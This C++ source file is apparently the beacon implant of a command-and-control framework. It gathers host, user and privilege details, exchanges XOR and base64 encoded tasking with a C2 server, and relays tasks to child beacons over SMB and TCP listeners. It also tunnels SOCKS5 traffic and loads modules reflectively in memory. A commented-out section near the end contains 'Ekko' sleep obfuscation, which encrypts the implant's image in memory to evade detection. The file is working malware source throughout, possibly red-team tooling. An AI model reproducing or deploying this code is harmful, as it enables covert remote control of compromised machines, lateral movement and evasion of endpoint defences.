#include "Beacon.hpp"

#include <random>

#ifdef __linux__

#include <unistd.h>
#include <sys/types.h>
#include <pwd.h>
#include <sys/utsname.h>
#include <dlfcn.h>

#include <MemoryModule.h>

typedef ModuleCmd* (*constructProc)();

#elif _WIN32

#include <wtsapi32.h>
#include <MemoryModule.h>


#define INFO_BUFFER_SIZE 32767
#define  ENV_VAR_STRING_COUNT  (sizeof(envVarStrings)/sizeof(TCHAR*))

typedef ModuleCmd* (*constructProc)();

#pragma comment(lib, "Wtsapi32.lib")

#endif

using namespace std;


// // XOR encrypted at compile time, so don't appear in string
// constexpr std::string_view _KeyTraficEncryption_ = "dfsdgferhzdzxczevre5595485sdg";
// constexpr std::string_view mainKeyConfig = ".CRT$XCL";

// // compile time encryption
// constexpr std::array<char, 29> _EncryptedKeyTraficEncryption_ = compileTimeXOR<29, 8>(_KeyTraficEncryption_, mainKeyConfig);


#ifdef __linux__
#elif _WIN32

enum IntegrityLevel 
{
	INTEGRITY_UNKNOWN,
	UNTRUSTED_INTEGRITY,
	LOW_INTEGRITY,
	MEDIUM_INTEGRITY,
	HIGH_INTEGRITY,
};

IntegrityLevel GetCurrentProcessIntegrityLevel() 
{
	HANDLE hToken = NULL;
	BOOL result = false;
	TOKEN_USER* tokenUser = NULL;
	DWORD dwLength = 0;

	OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);

	DWORD token_info_length = 0;
	if (::GetTokenInformation(hToken, TokenIntegrityLevel,
		nullptr, 0, &token_info_length) ||
		::GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
		return INTEGRITY_UNKNOWN;
	}

	auto token_label_bytes = std::make_unique<char[]>(token_info_length);
	TOKEN_MANDATORY_LABEL* token_label =
		reinterpret_cast<TOKEN_MANDATORY_LABEL*>(token_label_bytes.get());
	if (!::GetTokenInformation(hToken, TokenIntegrityLevel,
		token_label, token_info_length,
		&token_info_length)) {
		return INTEGRITY_UNKNOWN;
	}
	DWORD integrity_level = *::GetSidSubAuthority(
		token_label->Label.Sid,
		static_cast<DWORD>(*::GetSidSubAuthorityCount(token_label->Label.Sid) -
			1));

	if (integrity_level < SECURITY_MANDATORY_LOW_RID)
		return UNTRUSTED_INTEGRITY;

	if (integrity_level < SECURITY_MANDATORY_MEDIUM_RID)
		return LOW_INTEGRITY;

	if (integrity_level >= SECURITY_MANDATORY_MEDIUM_RID &&
		integrity_level < SECURITY_MANDATORY_HIGH_RID) {
		return MEDIUM_INTEGRITY;
	}

	if (integrity_level >= SECURITY_MANDATORY_HIGH_RID)
		return HIGH_INTEGRITY;

	return INTEGRITY_UNKNOWN;
}
#endif


Beacon::Beacon()
{	
	// // decrypt key
    // std::string keyDecrypted(std::begin(_EncryptedKeyTraficEncryption_), std::end(_EncryptedKeyTraficEncryption_));
    // std::string key(mainKeyConfig);
    // XOR(keyDecrypted, key);

	// m_key=keyDecrypted;

	m_beaconHash = random_string(SizeBeaconHash);
	m_aliveTimerMs = 1000;

	srand(time(NULL));

#ifdef __linux__

	char hostname[2048];
	char username[2048];
	gethostname(hostname, 2048);
	getlogin_r(username, 2048);

	m_hostname = hostname;
	m_username = username;

	uid_t uid = geteuid ();
	struct passwd *pw = getpwuid (uid);
	if (pw)
		m_username = std::string(pw->pw_name);

	struct utsname unameData;
	uname(&unameData);

	// TODO what to do with all that info ?? How to get it ??
	// std::cout << unameData.sysname << std::endl;
	// std::cout << unameData.nodename << std::endl;
	// std::cout << unameData.release << std::endl;
	// std::cout << unameData.version << std::endl;
	// std::cout << unameData.machine << std::endl;

	m_arch = unameData.machine;

	m_privilege = "user";
	if(m_username=="root")
		m_privilege = "root";
	
	m_os = unameData.sysname;
	m_os += " ";
	m_os += unameData.release;

#elif _WIN32

	TCHAR  infoBuf[INFO_BUFFER_SIZE];
	DWORD  bufCharCount = INFO_BUFFER_SIZE;

	// Get and display the name of the computer.
	m_hostname = "unknown";
	if( GetComputerName( infoBuf, &bufCharCount ) )
		m_hostname = infoBuf;

	std::string username1;
    if( GetUserName( infoBuf, &bufCharCount ) )
    	username1 = infoBuf;

	// ??
	std::string acctName;
	std::string domainname;

	TOKEN_USER tokenUser;
	ZeroMemory(&tokenUser, sizeof(TOKEN_USER));
	DWORD tokenUserLength = 0;

	PTOKEN_USER pTokenUser;
	GetTokenInformation(GetCurrentProcessToken(), TOKEN_INFORMATION_CLASS::TokenUser, NULL,      
	0, &tokenUserLength);
	pTokenUser = (PTOKEN_USER) new BYTE[tokenUserLength];

	if (GetTokenInformation(GetCurrentProcessToken(), TOKEN_INFORMATION_CLASS::TokenUser, pTokenUser, tokenUserLength, &tokenUserLength))
	{
		TCHAR szUserName[_MAX_PATH];
		DWORD dwUserNameLength = _MAX_PATH;
		TCHAR szDomainName[_MAX_PATH];
		DWORD dwDomainNameLength = _MAX_PATH;
		SID_NAME_USE sidNameUse;
		LookupAccountSid(NULL, pTokenUser->User.Sid, szUserName, &dwUserNameLength, szDomainName, &dwDomainNameLength, &sidNameUse);
		acctName=szUserName;
		domainname=szDomainName;
		delete pTokenUser;
	}

	if(!domainname.empty())
		m_username+=domainname;
	else if(!m_hostname.empty())
		m_username+=m_hostname;
	else 
		m_username+=".";

	m_username+="\\";
	if(!acctName.empty())
		m_username+=acctName;
	else if(!username1.empty())
		m_username+=username1;
	else 
		m_username+="unknow";

	SYSTEM_INFO systemInfo = { 0 };
	GetNativeSystemInfo(&systemInfo);

	m_arch = "x64";
	if (systemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL)
		m_arch = "x86";

	m_os = "Windows";

	IntegrityLevel integrityLevel = GetCurrentProcessIntegrityLevel();

	m_privilege = "-";
	if (integrityLevel == INTEGRITY_UNKNOWN)
		m_privilege = "UNKNOWN";
	else if (integrityLevel == UNTRUSTED_INTEGRITY)
		m_privilege = "UNTRUSTED";
	else if (integrityLevel == LOW_INTEGRITY)
		m_privilege = "LOW";
	else if (integrityLevel == MEDIUM_INTEGRITY)
		m_privilege = "MEDIUM";
	else if (integrityLevel == HIGH_INTEGRITY)
		m_privilege = "HIGH";

#endif

}


void Beacon::run()
{
	bool exit = false;
	while (!exit)
	{
		try 
		{
			checkIn();

			exit = runTasks();
			
			sleep();
		}
		catch(const std::exception& ex)
		{
			// std::cout << "Exeption " << std::endl;
			// std::cout << "Exeption " << ex.what() << std::endl;
			sleep();
		}
		catch (...) 
		{
			// std::cout << "Exeption" << std::endl;
			sleep();
		}
	}

	checkIn();
}


bool Beacon::initConfig(const std::string& config)
{
	nlohmann::json beaconConfig = nlohmann::json::parse(config);

	m_key = beaconConfig["xorKey"].get<std::string>();

	m_modulesConfig = beaconConfig["ModulesConfig"];
	
	return true;
}


// Distribute commands from C2 adress to this beacon and child beacons
bool Beacon::cmdToTasks(const std::string& input)
{
	std::string data;
	try
	{
		data = base64_decode(input);
	} 
	catch (...)
	{
		return false;
	}

	XOR(data, m_key);

	MultiBundleC2Message multiBundleC2Message;
	multiBundleC2Message.ParseFromArray(data.data(), (int)data.size());

	for (int k = 0; k < multiBundleC2Message.bundlec2messages_size(); k++) 
	{
		BundleC2Message* bundleC2Message = multiBundleC2Message.bundlec2messages(k);

		// Handle tasks address to this particular Beacon
		std::string beaconhash = bundleC2Message->beaconhash();
		if(beaconhash==m_beaconHash)
		{
			for (int j = 0; j < bundleC2Message->c2messages_size(); j++) 
			{
				const C2Message& c2Message = bundleC2Message->c2messages(j);
				m_tasks.push(c2Message);
			}
		}
		// Handle tasks address to child sessions
		else
		{
			for(int i=0; i<m_listeners.size(); i++)
			{
				for(int j=0; j<m_listeners[i]->getNumberOfSession(); j++)
				{
					std::shared_ptr<Session> ptr = m_listeners[i]->getSessionPtr(j);

					if(ptr->getBeaconHash()==beaconhash)
					{
						for (int k = 0; k < bundleC2Message->c2messages_size(); k++) 
						{
							const C2Message& c2Message = bundleC2Message->c2messages(k);
							m_listeners[i]->queueTask(beaconhash, c2Message);
						}
					}
				}
			}
		}
	}

	return true;
}


// Create the response message from the results of all the commmands send to this beacon and child beacons
bool Beacon::taskResultsToCmd(std::string& output)
{
	// Handle results of commands address to this particular Beacon
	MultiBundleC2Message multiBundleC2Message;
	BundleC2Message *bundleC2Message = multiBundleC2Message.add_bundlec2messages();

	// TODO check of m_taskResult contain a getInfo cmd and add context info if it does
	bundleC2Message->set_beaconhash(m_beaconHash);
	bundleC2Message->set_hostname(m_hostname);
	bundleC2Message->set_username(m_username);
	bundleC2Message->set_arch(m_arch);
	bundleC2Message->set_privilege(m_privilege);
	bundleC2Message->set_os(m_os);
	bundleC2Message->set_lastProofOfLife("0");

	while(!m_taskResult.empty())
	{
		C2Message c2MessageRet=m_taskResult.front();
		C2Message *addedC2MessageRet = bundleC2Message->add_c2messages();
		addedC2MessageRet->CopyFrom(c2MessageRet);
		m_taskResult.pop();
	}

	// Handle results of commands address to child sessions
	for(int i=0; i<m_listeners.size(); i++)
	{
		for(int j=0; j<m_listeners[i]->getNumberOfSession(); j++)
		{
			std::shared_ptr<Session> ptr = m_listeners[i]->getSessionPtr(j);

			BundleC2Message *bundleC2Message = multiBundleC2Message.add_bundlec2messages();
			
			// TODO check of m_taskResult contain a getInfo cmd and add context info if it does
			bundleC2Message->set_beaconhash(ptr->getBeaconHash());
			bundleC2Message->set_listenerhash(ptr->getListenerHash());
			bundleC2Message->set_hostname(ptr->getHostname());
			bundleC2Message->set_username(ptr->getUsername());
			bundleC2Message->set_arch(ptr->getArch());
			bundleC2Message->set_privilege(ptr->getPrivilege());
			bundleC2Message->set_os(ptr->getOs());
			bundleC2Message->set_lastProofOfLife(ptr->getLastProofOfLife());

			C2Message c2Message = ptr->getTaskResult();
			while(!c2Message.instruction().empty())
			{
				C2Message *addedC2MessageRet = bundleC2Message->add_c2messages();
				addedC2MessageRet->CopyFrom(c2Message);
				c2Message = ptr->getTaskResult();
			}
		}
	}

	std::string data;
	multiBundleC2Message.SerializeToString(&data);

	XOR(data, m_key);
	output = base64_encode(data);

	return true;
}


// Execute the right module corresponding to the command received from the C2
bool Beacon::runTasks()
{
	for(auto it = m_moduleCmd.begin() ; it != m_moduleCmd.end(); ++it )
	{
		C2Message c2RetMessage;
		int result = (*it)->recurringExec(c2RetMessage);

		if(result)
			m_taskResult.push(c2RetMessage);
	}

	// Handle every task adress to this beacon and put results in a list that will be usse to create the response message
	while(!m_tasks.empty())
	{
		C2Message c2Message = m_tasks.front();
		m_tasks.pop();

		C2Message c2RetMessage;
		bool exit = execInstruction(c2Message, c2RetMessage);

		std::string out;
		c2RetMessage.SerializeToString(&out);

		m_taskResult.push(c2RetMessage);

		if(exit)
			return exit; 
	}

	// For every listener add a proof of life to the result list that will be use to create the response message
	// It's usefull in case of link with the beacon die and is then reinstated
	for(int i=0; i<m_listeners.size(); i++)
	{
		C2Message listenerProofOfLife;

		std::string listenerHash = m_listeners[i]->getListenerHash();
		listenerProofOfLife.set_instruction(ListenerPollCmd);
		listenerProofOfLife.set_returnvalue(listenerHash);

		m_taskResult.push(listenerProofOfLife);
	}

	return false;
}


void Beacon::sleep()
{
	std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_real_distribution<> dis(0.8, 1.2); // 20% jitter range

    int jitteredTimeMs = static_cast<int>(m_aliveTimerMs * dis(gen));

    std::this_thread::sleep_for(std::chrono::milliseconds(jitteredTimeMs));

	// else
	// {
	// 	int dela = rand()%(int(float(m_aliveTimerMs)/100.0*20.0))-int(float(m_aliveTimerMs)/100.0*10.0);
	// 	int timeToSleepMs = m_aliveTimerMs + dela;

	// 	// EkkoObf( timeToSleepMs );
	// 	std::this_thread::sleep_for(std::chrono::milliseconds(timeToSleepMs));
	// }
}


// Main function that execute command comming from the C2
// Commands releated to modules are handle by them
// Commands releated to beacon internal functions are handle in this function
bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
{
	string instruction = c2Message.instruction();
	string cmd = c2Message.cmd();
	string uuid = c2Message.uuid();

	c2RetMessage.set_instruction(instruction);
	c2RetMessage.set_cmd(cmd);
	c2RetMessage.set_uuid(uuid);

	if (instruction == EndCmd)
	{
		c2RetMessage.set_returnvalue(CmdStatusSuccess);
		return true;
	}
	//
	// Sleep cmd
	//
	else if (instruction == SleepCmd)
	{
		std::string newSleepTimer = c2Message.cmd();
		
		try 
		{
			m_aliveTimerMs = std::stof(newSleepTimer)*1000;
			newSleepTimer = to_string(m_aliveTimerMs) + "ms";
		}
		catch (const std::invalid_argument& ia) 
		{
			newSleepTimer = CmdStatusFail;
		}

		c2RetMessage.set_returnvalue(newSleepTimer);
		return false;
	}
	//
	// Beacon Listener cmd
	//
	else if(instruction == ListenerCmd)
	{
		std::vector<std::string> splitedCmd;
		std::string delimiter = " ";
		splitList(cmd, delimiter, splitedCmd);

		// TODO handle error for other type of listener
		if(splitedCmd[0]==StartCmd)
		{
			if(splitedCmd[1]==ListenerSmbType)
			{
				std::string pipeName = splitedCmd[2];

				std::vector<unique_ptr<Listener>>::iterator object = 
					find_if(m_listeners.begin(), m_listeners.end(),
							[&](unique_ptr<Listener> & obj){ return obj->getParam1() == pipeName;}
							);

				if(object!=m_listeners.end())
				{
					c2RetMessage.set_errorCode(ERROR_LISTENER_EXIST);
					return false;
				}
				else
				{
					std::unique_ptr<ListenerSmb> listenerSmb = make_unique<ListenerSmb>(pipeName);
					std::string listenerHash = listenerSmb->getListenerHash();
					m_listeners.push_back(std::move(listenerSmb));

					// Respond with the listener hash
					c2RetMessage.set_cmd(cmd);
					c2RetMessage.set_returnvalue(listenerHash);
					return false;
				}
			}
			else if(splitedCmd[1]==ListenerTcpType)
			{
				std::string localHost = splitedCmd[2];
				int localPort;
				try
				{
					localPort = std::stoi(splitedCmd[3]);
				}
				catch (const std::invalid_argument& ia) 
				{
					c2RetMessage.set_errorCode(ERROR_PORT_FORMAT);
					return false;
				}

				std::vector<unique_ptr<Listener>>::iterator object = 
					find_if(m_listeners.begin(), m_listeners.end(),
							[&](unique_ptr<Listener> & obj){ return obj->getParam2() == splitedCmd[3];}
							);

				if(object!=m_listeners.end())
				{
					c2RetMessage.set_errorCode(ERROR_LISTENER_EXIST);
					return false;
				}
				else
				{
					std::unique_ptr<ListenerTcp> listenerTcp = make_unique<ListenerTcp>(localHost, localPort);
					int ret = listenerTcp->init();
					if (ret>0)
					{
						std::string listenerHash = listenerTcp->getListenerHash();
						m_listeners.push_back(std::move(listenerTcp));
						c2RetMessage.set_cmd(cmd);
						c2RetMessage.set_returnvalue(listenerHash);
						return false;
					} 
					else 
					{
						c2RetMessage.set_errorCode(ERROR_LISTENER_EXIST);
						return false;
					}										
				}
			}
		}
		else if(splitedCmd[0]==StopCmd)
		{
			std::string listenerHash=splitedCmd[1];

			std::vector<unique_ptr<Listener>>::iterator object = 
				find_if(m_listeners.begin(), m_listeners.end(),
						[&](unique_ptr<Listener> & obj){ return obj->getListenerHash().rfind(listenerHash,0)==0;}
						);

			if(object!=m_listeners.end())
			{
				c2RetMessage.set_cmd(cmd);
				c2RetMessage.set_returnvalue((*object)->getListenerHash());
				m_listeners.erase(std::remove(m_listeners.begin(), m_listeners.end(), *object));				
				return false;
			}
			else 
			{
				c2RetMessage.set_errorCode(ERROR_HASH_NOT_FOUND);
				return false;
			}
		}
	}
	//
	// Socks5 cmd
	//
	else if(instruction == Socks5Cmd)
	{
		SPDLOG_TRACE("Socks5 {} {} {}", c2Message.instruction(), c2Message.cmd(), c2Message.pid());

		c2RetMessage.set_pid(c2Message.pid());

		if(c2Message.cmd() == StartCmd)
		{
			return false;
		}
		else if(c2Message.cmd() == StopSocksCmd)
		{
			for(int i=0; i<m_socksTunnelClient.size(); i++)
				m_socksTunnelClient[i].reset(nullptr);

			return false;
		}
		else if(c2Message.cmd() == InitCmd)
		{
			SPDLOG_DEBUG("Socks5 init {}: {}:{}", c2Message.pid(), c2Message.data(), c2Message.args());
			std::unique_ptr<SocksTunnelClient> socksTunnelClient = std::make_unique<SocksTunnelClient>(c2Message.pid());

			try 
			{
				// TODO issu here ?
				uint32_t ip_dst = std::stoi(c2Message.data());
				uint16_t port = std::stoi(c2Message.args());
			
				int initResult = socksTunnelClient->init(ip_dst, port);
				if(initResult)
				{
					m_socksTunnelClient.push_back(std::move(socksTunnelClient));
					return false;
				}
				else
				{
					SPDLOG_DEBUG("Socks5 init {} failed", c2Message.pid());
					// handle the fact that the ip/port is not reachable and send to the TeamServer to kill the tunnel
					c2RetMessage.set_data("fail");
					return false;
				}
			}
			catch (const std::invalid_argument& ia) 
			{
				SPDLOG_DEBUG("Socks5 init {} failed", c2Message.pid());				
				c2RetMessage.set_errorCode(ERROR_GENERIC);
				return false;
			}

			SPDLOG_DEBUG("Socks5 init Finished");
		}
		else if(c2Message.cmd() == RunCmd)
		{
			SPDLOG_DEBUG("Socks5 run {}", c2Message.pid());

			for(int i=0; i<m_socksTunnelClient.size(); i++)
        	{
				SPDLOG_DEBUG("Socks5 run id with handle {}, id available {}", c2Message.pid(), m_socksTunnelClient[i]->getId());
				if(m_socksTunnelClient[i]!=nullptr)
				{
					if(m_socksTunnelClient[i]->getId()==c2Message.pid())
					{
						SPDLOG_DEBUG("Socks5 run process {}", c2Message.pid());
						SPDLOG_DEBUG("Socks5 run input {}", c2Message.data().size());

						std::string dataOut;
						int res = m_socksTunnelClient[i]->process(c2Message.data(), dataOut);

						SPDLOG_DEBUG("Socks5 run output {}",  dataOut.size());

						SPDLOG_DEBUG("Socks5 run process ok {}", c2Message.pid());

						// if(res<=0 || dataOut.size()==0)
						if(res<=0)
						{
							SPDLOG_DEBUG("Socks5 run stop {}", c2Message.pid());

							m_socksTunnelClient[i].reset(nullptr);
							c2RetMessage.set_cmd(StopCmd);
						}

						SPDLOG_DEBUG("Socks5 run process finished {}", c2Message.pid());

						c2RetMessage.set_data(dataOut);
					}
				}
			}

			SPDLOG_DEBUG("Socks5 run Finished");
		}
		else if(c2Message.cmd() == StopCmd)
		{
			SPDLOG_DEBUG("Socks5 stop {}", c2Message.pid());
			for(int i=0; i<m_socksTunnelClient.size(); i++)
        	{
				if(m_socksTunnelClient[i]!=nullptr)
				{
					if(m_socksTunnelClient[i]->getId()==c2Message.pid())
					{
						m_socksTunnelClient[i].reset(nullptr);
					}
				}
			}
			SPDLOG_DEBUG("Socks5 stop Finished");
		}

		SPDLOG_DEBUG("Finishing");

		// Remove ended tunnels
		m_socksTunnelClient.erase(std::remove_if(m_socksTunnelClient.begin(), m_socksTunnelClient.end(),
                             [](const std::unique_ptr<SocksTunnelClient>& ptr) { return ptr == nullptr; }),
              m_socksTunnelClient.end());

		SPDLOG_DEBUG("m_socksTunnelClient size {}", m_socksTunnelClient.size());
		
	}
	//
	// Load memory module cmd
	//
	else if(instruction == LoadC2ModuleCmd)
	{
#ifdef __linux__

		const std::string inputfile = c2Message.inputfile();
		std::string baseFilename = inputfile.substr(inputfile.find_last_of("/\\") + 1);
		const std::string buffer = c2Message.data();

		SPDLOG_DEBUG("LoadC2Module inputfile {}, buffer {}", baseFilename, buffer.size());

		void* handle = NULL;
		handle = MemoryLoadLibrary((char*)buffer.data(), buffer.size());
		if (handle == NULL)
		{
			c2RetMessage.set_errorCode(ERROR_LOAD_LIBRARY);
			return false;
		}

		SPDLOG_DEBUG("MemoryLoadLibrary handle {}", handle);
		
		// The exported function that expose the constructor must be releated to the libreary file name
		// file name = libExposedFunctionName.so <-> Exported function name = ExposedFunctionNameConstructor
		std::string funcName = baseFilename;
		funcName = funcName.substr(3); 							// remove lib
		funcName = funcName.substr(0, funcName.length() - 3);	// remove .so
		funcName += "Constructor";								// add Constructor

		SPDLOG_DEBUG("MemoryLoadLibrary funcName {}", funcName);

		constructProc construct;
		construct = (constructProc)dlsym(handle, funcName.c_str());
		if(construct == NULL) 
		{
			c2RetMessage.set_errorCode(ERROR_GET_PROC_ADDRESS);
			return false;
		}

		SPDLOG_DEBUG("MemoryLoadLibrary construct success" );

		ModuleCmd* moduleCmd = construct();

		// Check if the module is already loaded, if it is we free it and return
		unsigned long long moduleHash = moduleCmd->getHash();

		std::vector<unique_ptr<ModuleCmd>>::iterator object = 
			find_if(m_moduleCmd.begin(), m_moduleCmd.end(),
					[&](unique_ptr<ModuleCmd> & obj)
					{ 
						return obj->getHash() == moduleHash;
					}
					);

		if(object!=m_moduleCmd.end())
		{
			c2RetMessage.set_errorCode(ERROR_MODULE_ALREADY_LOADED);
			dlclose(handle);
			return false;
		}

		std::unique_ptr<ModuleCmd> moduleCmd_(moduleCmd);

		// initConfig for modules
		nlohmann::json config = m_modulesConfig;
        for (auto& it : config.items())
		{
			unsigned long long moduleHash = djb2(it.key());		
			if(moduleCmd_.get()->getHash() == moduleHash)
			{
				moduleCmd_.get()->initConfig(it.value());
			}
		}

		m_moduleCmd.push_back(std::move(moduleCmd_));



		c2RetMessage.set_returnvalue(CmdStatusSuccess);
		return false;
		
#elif _WIN32

		// TODO add a map of loaded modules, with inputfile/handled, to check of a module is already loaded and to be able to unload the handler

		const std::string inputfile = c2Message.inputfile();
		const std::string buffer = c2Message.data();

		HMEMORYMODULE handle = NULL;
		handle = MemoryLoadLibrary((char*)buffer.data(), buffer.size());
		if (handle == NULL)
		{
			DWORD errorMessageID = ::GetLastError();
			if(errorMessageID == 0) {
				return false;
			}

			LPSTR messageBuffer = nullptr;

			//Ask Win32 to give us the string version of that message ID.
			//The parameters we pass in, tell Win32 to create the buffer that holds the message for us (because we don't yet know how long the message string will be).
			size_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
										NULL, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);
			
			//Copy the error message into a std::string.
			std::string message(messageBuffer, size);
			
			//Free the Win32's string's buffer.
			LocalFree(messageBuffer);

			c2RetMessage.set_errorCode(ERROR_LOAD_LIBRARY);
			return false;
		}

		// the DLL only exports one function, try to load by ordinal value
		// If the dll export multiple function we got to make sur the export function come first (alphabetical number)
		constructProc construct;
		construct = (constructProc)MemoryGetProcAddress(handle, reinterpret_cast<LPCSTR>(0x01));
		if (!construct != NULL) 
		{
			c2RetMessage.set_errorCode(ERROR_GET_PROC_ADDRESS);
			return false;
		}
    
        ModuleCmd* moduleCmd = construct();

		// Check if the module is already loaded, if it is we free it and return
		unsigned long long moduleHash = moduleCmd->getHash();

		std::vector<unique_ptr<ModuleCmd>>::iterator object = 
			find_if(m_moduleCmd.begin(), m_moduleCmd.end(),
					[&](unique_ptr<ModuleCmd> & obj)
					{ 
						return obj->getHash() == moduleHash;
					}
					);

		if(object!=m_moduleCmd.end())
		{
			c2RetMessage.set_errorCode(ERROR_MODULE_ALREADY_LOADED);
			MemoryFreeLibrary(handle);
			return false;
		}

		std::unique_ptr<ModuleCmd> moduleCmd_(moduleCmd);

		// initConfig for modules
		nlohmann::json config = m_modulesConfig;
        for (auto& it : config.items())
		{
			unsigned long long moduleHash = djb2(it.key());		
			if(moduleCmd_.get()->getHash() == moduleHash)
			{
				moduleCmd_.get()->initConfig(it.value());
			}
		}

		m_moduleCmd.push_back(std::move(moduleCmd_));

		c2RetMessage.set_returnvalue(CmdStatusSuccess);
		return false;

#endif
	}
	else if(instruction == UnloadC2ModuleCmd)
	{
		// TODO should be able to close the handle to the dll/so
		// clean the memory
		std::string moduleName = c2Message.cmd();
		unsigned long long moduleHash = djb2(moduleName);

		std::vector<unique_ptr<ModuleCmd>>::iterator object = 
			find_if(m_moduleCmd.begin(), m_moduleCmd.end(),
					[&](unique_ptr<ModuleCmd> & obj)
					{ 
						if(obj->getName().empty())
							return obj->getHash() == moduleHash;
						else
							return obj->getName() == moduleName;
					}
					);

		if(object!=m_moduleCmd.end())
		{
#ifdef __linux__
			// TODO fail !
			Dl_info  DlInfo;
			if ((dladdr((void*)((*object)->getHash()), &DlInfo)) != 0)
			{
				dlclose(DlInfo.dli_fbase);
			}
#elif _WIN32
			HMODULE hModule = NULL;
			if(GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS |
				GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
				(LPCTSTR)(*object)->getHash(), &hModule))
			{
				// test with FreeLibrary, should use MemoryFreeLibrary ?
				FreeLibrary(hModule);
			}
#endif
			
			m_moduleCmd.erase(std::remove(m_moduleCmd.begin(), m_moduleCmd.end(), *object));
			c2RetMessage.set_returnvalue(CmdStatusSuccess);
			return false;
		}
		else
		{
			c2RetMessage.set_errorCode(ERROR_MODULE_NOT_FOUND);
			return false;
		}
	}
	//
	// Command to be executed by a loaded module
	//
	else
	{
		unsigned long long moduleHash = djb2(instruction);

		bool isModuleFound=false;
		for(auto it = m_moduleCmd.begin() ; it != m_moduleCmd.end(); ++it )
		{
			if (instruction == (*it)->getName() || moduleHash == (*it)->getHash())
			{
				(*it)->process(c2Message, c2RetMessage);
				isModuleFound=true;
			}
		}
		if(!isModuleFound)
		{
			c2RetMessage.set_returnvalue(CmdModuleNotFound);
		}
	}

	return false;
}

// OPSEC enable sleep obfuscation for x64

// #define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
// #define NtCurrentThread() (  ( HANDLE ) ( LONG_PTR ) -2 )
// #define NtCurrentProcess() ( ( HANDLE ) ( LONG_PTR ) -1 )

// typedef struct {
//     DWORD	Length;
//     DWORD	MaximumLength;
//     PVOID	Buffer;
// } USTRING ;



// VOID EkkoObf( DWORD SleepTime )
// {
//     CONTEXT CtxThread   = { 0 };

//     CONTEXT RopProtRW   = { 0 };
//     CONTEXT RopMemEnc   = { 0 };
//     CONTEXT RopDelay    = { 0 };
//     CONTEXT RopMemDec   = { 0 };
//     CONTEXT RopProtRX   = { 0 };
//     CONTEXT RopSetEvt   = { 0 };

//     HANDLE  hTimerQueue = NULL;
//     HANDLE  hNewTimer   = NULL;
//     HANDLE  hEvent      = NULL;
//     PVOID   ImageBase   = NULL;
//     DWORD   ImageSize   = 0;
//     DWORD   OldProtect  = 0;

// 	CHAR KeyBuf[16];
// 	unsigned int r = 0;
// 	for (int i = 0; i < 16; i++) 
// 		KeyBuf[i] = (CHAR) rand();

//     USTRING Key         = { 0 };
//     USTRING Img         = { 0 };

//     PVOID   NtContinue  = NULL;
//     PVOID   SysFunc032  = NULL;

//     hEvent      = CreateEventW( 0, 0, 0, 0 );
//     hTimerQueue = CreateTimerQueue();

//     NtContinue  = GetProcAddress( GetModuleHandleA( "Ntdll" ), "NtContinue" );
//     SysFunc032  = GetProcAddress( LoadLibraryA( "Advapi32" ),  "SystemFunction032" );

//     ImageBase   = GetModuleHandleA( NULL );
//     ImageSize   = ( ( PIMAGE_NT_HEADERS ) ( (DWORD64) ImageBase + ( ( PIMAGE_DOS_HEADER ) ImageBase )->e_lfanew ) )->OptionalHeader.SizeOfImage;

//     Key.Buffer  = KeyBuf;
//     Key.Length  = Key.MaximumLength = 16;

//     Img.Buffer  = ImageBase;
//     Img.Length  = Img.MaximumLength = ImageSize;

//     if ( CreateTimerQueueTimer( &hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)RtlCaptureContext, &CtxThread, 0, 0, WT_EXECUTEINTIMERTHREAD ) )
//     {
//         WaitForSingleObject( hEvent, 0x32 );

//         memcpy( &RopProtRW, &CtxThread, sizeof( CONTEXT ) );
//         memcpy( &RopMemEnc, &CtxThread, sizeof( CONTEXT ) );
//         memcpy( &RopDelay,  &CtxThread, sizeof( CONTEXT ) );
//         memcpy( &RopMemDec, &CtxThread, sizeof( CONTEXT ) );
//         memcpy( &RopProtRX, &CtxThread, sizeof( CONTEXT ) );
//         memcpy( &RopSetEvt, &CtxThread, sizeof( CONTEXT ) );

//         // VirtualProtect( ImageBase, ImageSize, PAGE_READWRITE, &OldProtect );
//         RopProtRW.Rsp  -= 8;
//         RopProtRW.Rip   = (DWORD64)VirtualProtect;
//         RopProtRW.Rcx   = (DWORD64)ImageBase;
//         RopProtRW.Rdx   = (DWORD64)ImageSize;
//         RopProtRW.R8    = (DWORD64)PAGE_READWRITE;
//         RopProtRW.R9    = (DWORD64)&OldProtect;

// 		// "RtlEncryptDecryptRC4"
//         // SystemFunction032( &Key, &Img );
//         RopMemEnc.Rsp  -= 8;
//         RopMemEnc.Rip   = (DWORD64)SysFunc032;
//         RopMemEnc.Rcx   = (DWORD64)&Img;
//         RopMemEnc.Rdx   = (DWORD64)&Key;

//         // WaitForSingleObject( hTargetHdl, SleepTime );
//         RopDelay.Rsp   -= 8;
//         RopDelay.Rip    = (DWORD64)WaitForSingleObject;
//         RopDelay.Rcx    = (DWORD64)NtCurrentProcess();
//         RopDelay.Rdx    = (DWORD64)SleepTime;

//         // SystemFunction032( &Key, &Img );
//         RopMemDec.Rsp  -= 8;
//         RopMemDec.Rip   = (DWORD64)SysFunc032;
//         RopMemDec.Rcx   = (DWORD64)&Img;
//         RopMemDec.Rdx   = (DWORD64)&Key;

//         // VirtualProtect( ImageBase, ImageSize, PAGE_EXECUTE_READWRITE, &OldProtect );
//         RopProtRX.Rsp  -= 8;
//         RopProtRX.Rip   = (DWORD64)VirtualProtect;
//         RopProtRX.Rcx   = (DWORD64)ImageBase;
//         RopProtRX.Rdx   = (DWORD64)ImageSize;
//         RopProtRX.R8    = (DWORD64)PAGE_EXECUTE_READWRITE;
//         RopProtRX.R9    = (DWORD64)&OldProtect;

//         // SetEvent( hEvent );
//         RopSetEvt.Rsp  -= 8;
//         RopSetEvt.Rip   = (DWORD64)SetEvent;
//         RopSetEvt.Rcx   = (DWORD64)hEvent;

